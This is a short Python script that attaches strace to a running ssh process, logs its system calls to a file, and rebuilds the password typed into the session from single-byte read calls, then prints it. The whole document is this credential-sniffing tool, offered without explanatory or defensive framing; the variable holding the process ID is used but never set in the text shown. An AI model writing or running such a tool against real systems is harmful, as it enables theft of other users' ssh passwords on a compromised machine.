import sys
import os
from re import split
import time

print("[+] PID of ssh: "+pid)
os.popen("strace -p "+pid +" -o strace.txt").read()
password=""
output=open("strace.txt")
for line in output:
    if "read" in line and "1) " in line:
            password=password + line.split("\"")[1]
len=len(password)
print("[+] Password: "+password[0:len-2])
output.close()
